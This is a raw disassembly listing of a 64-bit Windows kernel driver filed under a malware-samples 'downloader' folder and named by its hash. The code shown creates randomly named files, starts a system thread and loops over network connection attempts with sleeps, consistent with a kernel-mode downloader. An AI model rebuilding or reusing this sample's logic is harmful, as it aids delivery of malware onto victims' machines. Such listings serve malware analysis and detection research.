
malware_samples/downloader/c2b051d4be9deed56d51a3579868f76022d91d14511fc84eb51749fc225d8121.sys:     file format pei-x86-64


Disassembly of section .text:

0000000000011000 <.text>:
	...
   11008:	40 53                	rex push %rbx
   1100a:	48 83 ec 30          	sub    $0x30,%rsp
   1100e:	48 8b d9             	mov    %rcx,%rbx
   11011:	48 8d 15 98 37 00 00 	lea    0x3798(%rip),%rdx        # 0x147b0
   11018:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1101d:	ff 15 e5 3f 00 00    	call   *0x3fe5(%rip)        # 0x15008
   11023:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   11028:	ff 15 d2 3f 00 00    	call   *0x3fd2(%rip)        # 0x15000
   1102e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   11032:	ff 15 d8 3f 00 00    	call   *0x3fd8(%rip)        # 0x15010
   11038:	48 83 c4 30          	add    $0x30,%rsp
   1103c:	5b                   	pop    %rbx
   1103d:	c3                   	ret
   1103e:	cc                   	int3
   1103f:	cc                   	int3
   11040:	cc                   	int3
   11041:	cc                   	int3
   11042:	cc                   	int3
   11043:	cc                   	int3
   11044:	48 83 ec 28          	sub    $0x28,%rsp
   11048:	48 83 62 38 00       	andq   $0x0,0x38(%rdx)
   1104d:	83 62 30 00          	andl   $0x0,0x30(%rdx)
   11051:	48 8b ca             	mov    %rdx,%rcx
   11054:	b2 02                	mov    $0x2,%dl
   11056:	ff 15 dc 3f 00 00    	call   *0x3fdc(%rip)        # 0x15038
   1105c:	33 c0                	xor    %eax,%eax
   1105e:	48 83 c4 28          	add    $0x28,%rsp
   11062:	c3                   	ret
   11063:	cc                   	int3
   11064:	cc                   	int3
   11065:	cc                   	int3
   11066:	cc                   	int3
   11067:	cc                   	int3
   11068:	cc                   	int3
   11069:	cc                   	int3
   1106a:	cc                   	int3
   1106b:	cc                   	int3
   1106c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   11071:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   11076:	57                   	push   %rdi
   11077:	48 81 ec 80 01 00 00 	sub    $0x180,%rsp
   1107e:	48 8b 05 7b 50 00 00 	mov    0x507b(%rip),%rax        # 0x16100
   11085:	48 33 c4             	xor    %rsp,%rax
   11088:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   1108f:	00 
   11090:	48 8b d9             	mov    %rcx,%rbx
   11093:	48 8d 79 70          	lea    0x70(%rcx),%rdi
   11097:	48 8d 05 a6 ff ff ff 	lea    -0x5a(%rip),%rax        # 0x11044
   1109e:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   110a3:	48 8d 15 86 54 00 00 	lea    0x5486(%rip),%rdx        # 0x16530
   110aa:	48 89 1d 7f 58 00 00 	mov    %rbx,0x587f(%rip)        # 0x16930
   110b1:	f3 48 ab             	rep stos %rax,(%rdi)
   110b4:	48 8d 05 4d ff ff ff 	lea    -0xb3(%rip),%rax        # 0x11008
   110bb:	bf 08 00 00 00       	mov    $0x8,%edi
   110c0:	8b cf                	mov    %edi,%ecx
   110c2:	48 89 43 68          	mov    %rax,0x68(%rbx)
   110c6:	e8 e5 02 00 00       	call   0x113b0
   110cb:	48 8d 15 5e 56 00 00 	lea    0x565e(%rip),%rdx        # 0x16730
   110d2:	8b cf                	mov    %edi,%ecx
   110d4:	e8 d7 02 00 00       	call   0x113b0
   110d9:	bf 00 02 00 00       	mov    $0x200,%edi
   110de:	33 f6                	xor    %esi,%esi
   110e0:	48 8b d7             	mov    %rdi,%rdx
   110e3:	33 c9                	xor    %ecx,%ecx
   110e5:	66 89 35 a4 61 00 00 	mov    %si,0x61a4(%rip)        # 0x17290
   110ec:	66 89 3d 9f 61 00 00 	mov    %di,0x619f(%rip)        # 0x17292
   110f3:	ff 15 2f 3f 00 00    	call   *0x3f2f(%rip)        # 0x15028
   110f9:	4c 8b c7             	mov    %rdi,%r8
   110fc:	48 8b c8             	mov    %rax,%rcx
   110ff:	33 d2                	xor    %edx,%edx
   11101:	48 89 05 90 61 00 00 	mov    %rax,0x6190(%rip)        # 0x17298
   11108:	e8 33 31 00 00       	call   0x14240
   1110d:	48 8b 0d 84 61 00 00 	mov    0x6184(%rip),%rcx        # 0x17298
   11114:	4c 8d 05 15 54 00 00 	lea    0x5415(%rip),%r8        # 0x16530
   1111b:	48 8d 15 fe 35 00 00 	lea    0x35fe(%rip),%rdx        # 0x14720
   11122:	ff 15 f0 3e 00 00    	call   *0x3ef0(%rip)        # 0x15018
   11128:	48 8b 3d 69 61 00 00 	mov    0x6169(%rip),%rdi        # 0x17298
   1112f:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   11133:	33 c0                	xor    %eax,%eax
   11135:	33 d2                	xor    %edx,%edx
   11137:	41 b8 fe 00 00 00    	mov    $0xfe,%r8d
   1113d:	66 f2 af             	repnz scas (%rdi),%ax
   11140:	66 89 74 24 70       	mov    %si,0x70(%rsp)
   11145:	48 f7 d1             	not    %rcx
   11148:	48 ff c9             	dec    %rcx
   1114b:	66 03 c9             	add    %cx,%cx
   1114e:	66 89 0d 3b 61 00 00 	mov    %cx,0x613b(%rip)        # 0x17290
   11155:	48 8d 4c 24 72       	lea    0x72(%rsp),%rcx
   1115a:	e8 e1 30 00 00       	call   0x14240
   1115f:	48 8b d6             	mov    %rsi,%rdx
   11162:	48 8d 05 27 36 00 00 	lea    0x3627(%rip),%rax        # 0x14790
   11169:	0f b7 04 02          	movzwl (%rdx,%rax,1),%eax
   1116d:	48 83 c2 02          	add    $0x2,%rdx
   11171:	66 89 44 14 6e       	mov    %ax,0x6e(%rsp,%rdx,1)
   11176:	66 3b c6             	cmp    %si,%ax
   11179:	75 e7                	jne    0x11162
   1117b:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   11180:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   11185:	ff 15 7d 3e 00 00    	call   *0x3e7d(%rip)        # 0x15008
   1118b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   11190:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   11195:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   1119a:	41 b9 07 00 00 00    	mov    $0x7,%r9d
   111a0:	48 8b cb             	mov    %rbx,%rcx
   111a3:	33 d2                	xor    %edx,%edx
   111a5:	40 88 74 24 28       	mov    %sil,0x28(%rsp)
   111aa:	89 74 24 20          	mov    %esi,0x20(%rsp)
   111ae:	ff 15 94 3e 00 00    	call   *0x3e94(%rip)        # 0x15048
   111b4:	3b c6                	cmp    %esi,%eax
   111b6:	7c 48                	jl     0x11200
   111b8:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   111bd:	48 8d 15 ec 35 00 00 	lea    0x35ec(%rip),%rdx        # 0x147b0
   111c4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   111c9:	83 48 30 04          	orl    $0x4,0x30(%rax)
   111cd:	ff 15 35 3e 00 00    	call   *0x3e35(%rip)        # 0x15008
   111d3:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   111d8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   111dd:	ff 15 5d 3e 00 00    	call   *0x3e5d(%rip)        # 0x15040
   111e3:	3b c6                	cmp    %esi,%eax
   111e5:	7d 0d                	jge    0x111f4
   111e7:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   111ec:	ff 15 1e 3e 00 00    	call   *0x3e1e(%rip)        # 0x15010
   111f2:	eb 0c                	jmp    0x11200
   111f4:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   111f9:	48 89 05 38 57 00 00 	mov    %rax,0x5738(%rip)        # 0x16938
   11200:	48 8d 05 6d 09 00 00 	lea    0x96d(%rip),%rax        # 0x11b74
   11207:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1120c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   11211:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   11216:	45 33 c9             	xor    %r9d,%r9d
   11219:	45 33 c0             	xor    %r8d,%r8d
   1121c:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   11221:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   11226:	ff 15 f4 3d 00 00    	call   *0x3df4(%rip)        # 0x15020
   1122c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   11231:	ff 15 f9 3d 00 00    	call   *0x3df9(%rip)        # 0x15030
   11237:	33 c0                	xor    %eax,%eax
   11239:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   11240:	00 
   11241:	48 33 cc             	xor    %rsp,%rcx
   11244:	e8 77 2f 00 00       	call   0x141c0
   11249:	4c 8d 9c 24 80 01 00 	lea    0x180(%rsp),%r11
   11250:	00 
   11251:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   11255:	49 8b 73 20          	mov    0x20(%r11),%rsi
   11259:	49 8b e3             	mov    %r11,%rsp
   1125c:	5f                   	pop    %rdi
   1125d:	c3                   	ret
   1125e:	cc                   	int3
   1125f:	cc                   	int3
   11260:	cc                   	int3
   11261:	cc                   	int3
   11262:	cc                   	int3
   11263:	cc                   	int3
   11264:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   11269:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1126e:	53                   	push   %rbx
   1126f:	56                   	push   %rsi
   11270:	57                   	push   %rdi
   11271:	48 83 ec 20          	sub    $0x20,%rsp
   11275:	33 db                	xor    %ebx,%ebx
   11277:	48 8b f1             	mov    %rcx,%rsi
   1127a:	48 85 d2             	test   %rdx,%rdx
   1127d:	74 09                	je     0x11288
   1127f:	48 81 fa ff ff ff 7f 	cmp    $0x7fffffff,%rdx
   11286:	76 05                	jbe    0x1128d
   11288:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1128d:	85 db                	test   %ebx,%ebx
   1128f:	78 2e                	js     0x112bf
   11291:	48 8d 7a ff          	lea    -0x1(%rdx),%rdi
   11295:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1129a:	33 db                	xor    %ebx,%ebx
   1129c:	48 8b d7             	mov    %rdi,%rdx
   1129f:	ff 15 f3 3d 00 00    	call   *0x3df3(%rip)        # 0x15098
   112a5:	85 c0                	test   %eax,%eax
   112a7:	78 0e                	js     0x112b7
   112a9:	48 98                	cltq
   112ab:	48 3b c7             	cmp    %rdi,%rax
   112ae:	77 07                	ja     0x112b7
   112b0:	75 0d                	jne    0x112bf
   112b2:	88 1c 37             	mov    %bl,(%rdi,%rsi,1)
   112b5:	eb 08                	jmp    0x112bf
   112b7:	88 1c 37             	mov    %bl,(%rdi,%rsi,1)
   112ba:	bb 05 00 00 80       	mov    $0x80000005,%ebx
   112bf:	8b c3                	mov    %ebx,%eax
   112c1:	48 83 c4 20          	add    $0x20,%rsp
   112c5:	5f                   	pop    %rdi
   112c6:	5e                   	pop    %rsi
   112c7:	5b                   	pop    %rbx
   112c8:	c3                   	ret
   112c9:	cc                   	int3
   112ca:	cc                   	int3
   112cb:	cc                   	int3
   112cc:	cc                   	int3
   112cd:	cc                   	int3
   112ce:	cc                   	int3
   112cf:	cc                   	int3
   112d0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   112d5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   112da:	53                   	push   %rbx
   112db:	55                   	push   %rbp
   112dc:	56                   	push   %rsi
   112dd:	57                   	push   %rdi
   112de:	48 83 ec 28          	sub    $0x28,%rsp
   112e2:	48 d1 ea             	shr    $1,%rdx
   112e5:	bd 00 00 00 00       	mov    $0x0,%ebp
   112ea:	48 8b f1             	mov    %rcx,%rsi
   112ed:	8b dd                	mov    %ebp,%ebx
   112ef:	74 09                	je     0x112fa
   112f1:	48 81 fa ff ff ff 7f 	cmp    $0x7fffffff,%rdx
   112f8:	76 05                	jbe    0x112ff
   112fa:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   112ff:	3b dd                	cmp    %ebp,%ebx
   11301:	7c 2c                	jl     0x1132f
   11303:	48 8d 7a ff          	lea    -0x1(%rdx),%rdi
   11307:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   1130c:	8b dd                	mov    %ebp,%ebx
   1130e:	48 8b d7             	mov    %rdi,%rdx
   11311:	ff 15 79 3d 00 00    	call   *0x3d79(%rip)        # 0x15090
   11317:	3b c5                	cmp    %ebp,%eax
   11319:	7c 0b                	jl     0x11326
   1131b:	48 98                	cltq
   1131d:	48 3b c7             	cmp    %rdi,%rax
   11320:	77 04                	ja     0x11326
   11322:	75 0b                	jne    0x1132f
   11324:	eb 05                	jmp    0x1132b
   11326:	bb 05 00 00 80       	mov    $0x80000005,%ebx
   1132b:	66 89 2c 7e          	mov    %bp,(%rsi,%rdi,2)
   1132f:	8b c3                	mov    %ebx,%eax
   11331:	48 83 c4 28          	add    $0x28,%rsp
   11335:	5f                   	pop    %rdi
   11336:	5e                   	pop    %rsi
   11337:	5d                   	pop    %rbp
   11338:	5b                   	pop    %rbx
   11339:	c3                   	ret
   1133a:	cc                   	int3
   1133b:	cc                   	int3
   1133c:	cc                   	int3
   1133d:	cc                   	int3
   1133e:	cc                   	int3
   1133f:	cc                   	int3
   11340:	48 83 ec 38          	sub    $0x38,%rsp
   11344:	48 63 c1             	movslq %ecx,%rax
   11347:	48 69 c0 80 69 67 ff 	imul   $0xffffffffff676980,%rax,%rax
   1134e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   11353:	48 8b 05 f6 56 00 00 	mov    0x56f6(%rip),%rax        # 0x16a50
   1135a:	48 85 c0             	test   %rax,%rax
   1135d:	75 3a                	jne    0x11399
   1135f:	48 8d 15 7a 34 00 00 	lea    0x347a(%rip),%rdx        # 0x147e0
   11366:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1136b:	ff 15 97 3c 00 00    	call   *0x3c97(%rip)        # 0x15008
   11371:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   11376:	ff 15 f4 3c 00 00    	call   *0x3cf4(%rip)        # 0x15070
   1137c:	48 89 05 cd 56 00 00 	mov    %rax,0x56cd(%rip)        # 0x16a50
   11383:	48 85 c0             	test   %rax,%rax
   11386:	75 11                	jne    0x11399
   11388:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   1138d:	33 d2                	xor    %edx,%edx
   1138f:	33 c9                	xor    %ecx,%ecx
   11391:	ff 15 e9 3c 00 00    	call   *0x3ce9(%rip)        # 0x15080
   11397:	eb 0b                	jmp    0x113a4
   11399:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   1139e:	33 d2                	xor    %edx,%edx
   113a0:	33 c9                	xor    %ecx,%ecx
   113a2:	ff d0                	call   *%rax
   113a4:	48 83 c4 38          	add    $0x38,%rsp
   113a8:	c3                   	ret
   113a9:	cc                   	int3
   113aa:	cc                   	int3
   113ab:	cc                   	int3
   113ac:	cc                   	int3
   113ad:	cc                   	int3
   113ae:	cc                   	int3
   113af:	cc                   	int3
   113b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   113b5:	57                   	push   %rdi
   113b6:	48 83 ec 20          	sub    $0x20,%rsp
   113ba:	48 8b fa             	mov    %rdx,%rdi
   113bd:	33 db                	xor    %ebx,%ebx
   113bf:	48 b8 14 00 00 00 80 	movabs $0xfffff78000000014,%rax
   113c6:	f7 ff ff 
   113c9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   113ce:	48 8b 00             	mov    (%rax),%rax
   113d1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   113d6:	ff 15 c4 3c 00 00    	call   *0x3cc4(%rip)        # 0x150a0
   113dc:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   113e1:	44 8b d8             	mov    %eax,%r11d
   113e4:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   113e9:	33 c9                	xor    %ecx,%ecx
   113eb:	48 c7 44 24 48 20 6c 	movq   $0xfffffffffffb6c20,0x48(%rsp)
   113f2:	fb ff 
   113f4:	41 f7 e3             	mul    %r11d
   113f7:	c1 ea 03             	shr    $0x3,%edx
   113fa:	66 6b d2 19          	imul   $0x19,%dx,%dx
   113fe:	66 44 2b da          	sub    %dx,%r11w
   11402:	33 d2                	xor    %edx,%edx
   11404:	66 41 83 c3 61       	add    $0x61,%r11w
   11409:	66 44 89 1c 5f       	mov    %r11w,(%rdi,%rbx,2)
   1140e:	ff 15 6c 3c 00 00    	call   *0x3c6c(%rip)        # 0x15080
   11414:	48 ff c3             	inc    %rbx
   11417:	48 83 fb 08          	cmp    $0x8,%rbx
   1141b:	7c a2                	jl     0x113bf
   1141d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   11422:	48 83 c4 20          	add    $0x20,%rsp
   11426:	5f                   	pop    %rdi
   11427:	c3                   	ret
   11428:	cc                   	int3
   11429:	cc                   	int3
   1142a:	cc                   	int3
   1142b:	cc                   	int3
   1142c:	cc                   	int3
   1142d:	cc                   	int3
   1142e:	cc                   	int3
   1142f:	cc                   	int3
   11430:	4c 8b dc             	mov    %rsp,%r11
   11433:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   11437:	49 89 73 18          	mov    %rsi,0x18(%r11)
   1143b:	57                   	push   %rdi
   1143c:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   11443:	49 83 63 10 00       	andq   $0x0,0x10(%r11)
   11448:	41 83 63 20 00       	andl   $0x0,0x20(%r11)
   1144d:	33 c0                	xor    %eax,%eax
   1144f:	41 21 43 a8          	and    %eax,-0x58(%r11)
   11453:	41 8b f8             	mov    %r8d,%edi
   11456:	48 8b d9             	mov    %rcx,%rbx
   11459:	48 8b f2             	mov    %rdx,%rsi
   1145c:	44 8d 40 14          	lea    0x14(%rax),%r8d
   11460:	49 8d 4b ac          	lea    -0x54(%r11),%rcx
   11464:	33 d2                	xor    %edx,%edx
   11466:	41 89 43 24          	mov    %eax,0x24(%r11)
   1146a:	e8 d1 2d 00 00       	call   0x14240
   1146f:	48 85 f6             	test   %rsi,%rsi
   11472:	0f 84 35 01 00 00    	je     0x115ad
   11478:	85 ff                	test   %edi,%edi
   1147a:	0f 84 2d 01 00 00    	je     0x115ad
   11480:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   11485:	48 8b d3             	mov    %rbx,%rdx
   11488:	ff 15 7a 3b 00 00    	call   *0x3b7a(%rip)        # 0x15008
   1148e:	83 64 24 50 00       	andl   $0x0,0x50(%rsp)
   11493:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   11499:	48 83 a4 24 a0 00 00 	andq   $0x0,0xa0(%rsp)
   114a0:	00 00 
   114a2:	48 83 a4 24 b8 00 00 	andq   $0x0,0xb8(%rsp)
   114a9:	00 00 
   114ab:	48 83 a4 24 c0 00 00 	andq   $0x0,0xc0(%rsp)
   114b2:	00 00 
   114b4:	c7 44 24 40 60 00 00 	movl   $0x60,0x40(%rsp)
   114bb:	00 
   114bc:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   114c1:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   114c6:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   114cd:	00 
   114ce:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   114d3:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   114da:	00 
   114db:	48 8d 8c 24 e8 00 00 	lea    0xe8(%rsp),%rcx
   114e2:	00 
   114e3:	ba 00 00 00 40       	mov    $0x40000000,%edx
   114e8:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   114ef:	00 
   114f0:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   114f6:	c7 84 24 98 00 00 00 	movl   $0x30,0x98(%rsp)
   114fd:	30 00 00 00 
   11501:	c7 84 24 b0 00 00 00 	movl   $0x240,0xb0(%rsp)
   11508:	40 02 00 00 
   1150c:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   11513:	00 
   11514:	ff 15 6e 3b 00 00    	call   *0x3b6e(%rip)        # 0x15088
   1151a:	8b d8                	mov    %eax,%ebx
   1151c:	85 c0                	test   %eax,%eax
   1151e:	0f 88 85 00 00 00    	js     0x115a9
   11524:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   1152b:	00 
   1152c:	4c 8d 84 24 80 00 00 	lea    0x80(%rsp),%r8
   11533:	00 
   11534:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   11539:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   1153f:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   11546:	00 
   11547:	ff 15 6b 3b 00 00    	call   *0x3b6b(%rip)        # 0x150b8
   1154d:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   11553:	4c 8b 9c 24 88 00 00 	mov    0x88(%rsp),%r11
   1155a:	00 
   1155b:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   11562:	00 
   11563:	48 8d 84 24 f8 00 00 	lea    0xf8(%rsp),%rax
   1156a:	00 
   1156b:	45 33 c9             	xor    %r9d,%r9d
   1156e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   11573:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   11578:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   1157c:	45 33 c0             	xor    %r8d,%r8d
   1157f:	33 d2                	xor    %edx,%edx
   11581:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   11586:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1158b:	4c 89 9c 24 f8 00 00 	mov    %r11,0xf8(%rsp)
   11592:	00 
   11593:	ff 15 3f 3b 00 00    	call   *0x3b3f(%rip)        # 0x150d8
   11599:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   115a0:	00 
   115a1:	8b d8                	mov    %eax,%ebx
   115a3:	ff 15 87 3a 00 00    	call   *0x3a87(%rip)        # 0x15030
   115a9:	8b c3                	mov    %ebx,%eax
   115ab:	eb 05                	jmp    0x115b2
   115ad:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   115b2:	4c 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%r11
   115b9:	00 
   115ba:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   115be:	49 8b 73 20          	mov    0x20(%r11),%rsi
   115c2:	49 8b e3             	mov    %r11,%rsp
   115c5:	5f                   	pop    %rdi
   115c6:	c3                   	ret
   115c7:	cc                   	int3
   115c8:	cc                   	int3
   115c9:	cc                   	int3
   115ca:	cc                   	int3
   115cb:	cc                   	int3
   115cc:	cc                   	int3
   115cd:	cc                   	int3
   115ce:	cc                   	int3
   115cf:	cc                   	int3
   115d0:	40 53                	rex push %rbx
   115d2:	55                   	push   %rbp
   115d3:	56                   	push   %rsi
   115d4:	57                   	push   %rdi
   115d5:	41 54                	push   %r12
   115d7:	41 55                	push   %r13
   115d9:	41 56                	push   %r14
   115db:	48 81 ec b0 06 00 00 	sub    $0x6b0,%rsp
   115e2:	48 8b 05 17 4b 00 00 	mov    0x4b17(%rip),%rax        # 0x16100
   115e9:	48 33 c4             	xor    %rsp,%rax
   115ec:	48 89 84 24 a0 06 00 	mov    %rax,0x6a0(%rsp)
   115f3:	00 
   115f4:	40 8a f9             	mov    %cl,%dil
   115f7:	45 8b e0             	mov    %r8d,%r12d
   115fa:	48 8b ea             	mov    %rdx,%rbp
   115fd:	48 8d 8c 24 92 00 00 	lea    0x92(%rsp),%rcx
   11604:	00 
   11605:	33 db                	xor    %ebx,%ebx
   11607:	33 d2                	xor    %edx,%edx
   11609:	41 b8 06 02 00 00    	mov    $0x206,%r8d
   1160f:	4d 8b e9             	mov    %r9,%r13
   11612:	66 89 9c 24 90 00 00 	mov    %bx,0x90(%rsp)
   11619:	00 
   1161a:	e8 21 2c 00 00       	call   0x14240
   1161f:	33 c0                	xor    %eax,%eax
   11621:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   11625:	88 5c 24 70          	mov    %bl,0x70(%rsp)
   11629:	89 5c 24 44          	mov    %ebx,0x44(%rsp)
   1162d:	48 89 44 24 71       	mov    %rax,0x71(%rsp)
   11632:	48 89 44 24 79       	mov    %rax,0x79(%rsp)
   11637:	48 89 84 24 81 00 00 	mov    %rax,0x81(%rsp)
   1163e:	00 
   1163f:	89 84 24 89 00 00 00 	mov    %eax,0x89(%rsp)
   11646:	66 89 84 24 8d 00 00 	mov    %ax,0x8d(%rsp)
   1164d:	00 
   1164e:	88 84 24 8f 00 00 00 	mov    %al,0x8f(%rsp)
   11655:	40 3a fb             	cmp    %bl,%dil
   11658:	0f 85 6c 01 00 00    	jne    0x117ca
   1165e:	8d 73 02             	lea    0x2(%rbx),%esi
   11661:	48 8d 8c 24 a1 02 00 	lea    0x2a1(%rsp),%rcx
   11668:	00 
   11669:	33 d2                	xor    %edx,%edx
   1166b:	41 b8 ff 03 00 00    	mov    $0x3ff,%r8d
   11671:	88 9c 24 a0 02 00 00 	mov    %bl,0x2a0(%rsp)
   11678:	e8 c3 2b 00 00       	call   0x14240
   1167d:	ba 38 00 00 00       	mov    $0x38,%edx
   11682:	33 c9                	xor    %ecx,%ecx
   11684:	ff 15 9e 39 00 00    	call   *0x399e(%rip)        # 0x15028
   1168a:	48 8b f8             	mov    %rax,%rdi
   1168d:	48 3b c3             	cmp    %rbx,%rax
   11690:	75 05                	jne    0x11697
   11692:	49 8b fe             	mov    %r14,%rdi
   11695:	eb 1d                	jmp    0x116b4
   11697:	33 d2                	xor    %edx,%edx
   11699:	48 8b c8             	mov    %rax,%rcx
   1169c:	44 8d 42 38          	lea    0x38(%rdx),%r8d
   116a0:	e8 9b 2b 00 00       	call   0x14240
   116a5:	89 37                	mov    %esi,(%rdi)
   116a7:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   116ab:	48 f7 df             	neg    %rdi
   116ae:	0f 84 a1 00 00 00    	je     0x11755
   116b4:	33 d2                	xor    %edx,%edx
   116b6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   116bb:	44 8d 42 10          	lea    0x10(%rdx),%r8d
   116bf:	e8 7c 2b 00 00       	call   0x14240
   116c4:	b8 00 35 00 00       	mov    $0x3500,%eax
   116c9:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   116ce:	48 8d 0d 1b 33 00 00 	lea    0x331b(%rip),%rcx        # 0x149f0
   116d5:	66 89 74 24 60       	mov    %si,0x60(%rsp)
   116da:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   116df:	e8 68 17 00 00       	call   0x12e4c
   116e4:	83 c9 ff             	or     $0xffffffff,%ecx
   116e7:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   116ec:	3b c3                	cmp    %ebx,%eax
   116ee:	4c 8b c5             	mov    %rbp,%r8
   116f1:	0f 45 4c 24 40       	cmovne 0x40(%rsp),%ecx
   116f6:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   116fa:	48 8b cf             	mov    %rdi,%rcx
   116fd:	0f 28 44 24 60       	movaps 0x60(%rsp),%xmm0
   11702:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   11708:	e8 bf 0a 00 00       	call   0x121cc
   1170d:	48 8b cf             	mov    %rdi,%rcx
   11710:	3b c3                	cmp    %ebx,%eax
   11712:	7e 3c                	jle    0x11750
   11714:	48 8d 94 24 a0 02 00 	lea    0x2a0(%rsp),%rdx
   1171b:	00 
   1171c:	e8 e7 07 00 00       	call   0x11f08
   11721:	3a c3                	cmp    %bl,%al
   11723:	75 28                	jne    0x1174d
   11725:	48 f7 df             	neg    %rdi
   11728:	38 5f 04             	cmp    %bl,0x4(%rdi)
   1172b:	74 13                	je     0x11740
   1172d:	39 37                	cmp    %esi,(%rdi)
   1172f:	74 05                	je     0x11736
   11731:	83 3f 01             	cmpl   $0x1,(%rdi)
   11734:	75 0a                	jne    0x11740
   11736:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1173a:	ff 15 70 39 00 00    	call   *0x3970(%rip)        # 0x150b0
   11740:	33 d2                	xor    %edx,%edx
   11742:	48 8b cf             	mov    %rdi,%rcx
   11745:	ff 15 15 39 00 00    	call   *0x3915(%rip)        # 0x15060
   1174b:	eb 08                	jmp    0x11755
   1174d:	48 8b cf             	mov    %rdi,%rcx
   11750:	e8 3f 12 00 00       	call   0x12994
   11755:	33 c0                	xor    %eax,%eax
   11757:	48 8d bc 24 a0 02 00 	lea    0x2a0(%rsp),%rdi
   1175e:	00 
   1175f:	49 8b ce             	mov    %r14,%rcx
   11762:	f2 ae                	repnz scas (%rdi),%al
   11764:	48 f7 d1             	not    %rcx
   11767:	48 83 e9 01          	sub    $0x1,%rcx
   1176b:	74 25                	je     0x11792
   1176d:	8d 41 01             	lea    0x1(%rcx),%eax
   11770:	83 f8 20             	cmp    $0x20,%eax
   11773:	7f 1d                	jg     0x11792
   11775:	48 8d b4 24 a0 02 00 	lea    0x2a0(%rsp),%rsi
   1177c:	00 
   1177d:	48 8d 3d 8c 32 00 00 	lea    0x328c(%rip),%rdi        # 0x14a10
   11784:	b9 0a 00 00 00       	mov    $0xa,%ecx
   11789:	f3 a6                	repz cmpsb (%rdi),(%rsi)
   1178b:	75 14                	jne    0x117a1
   1178d:	be 02 00 00 00       	mov    $0x2,%esi
   11792:	b9 05 00 00 00       	mov    $0x5,%ecx
   11797:	e8 a4 fb ff ff       	call   0x11340
   1179c:	e9 c0 fe ff ff       	jmp    0x11661
   117a1:	33 c0                	xor    %eax,%eax
   117a3:	48 8d bc 24 a0 02 00 	lea    0x2a0(%rsp),%rdi
   117aa:	00 
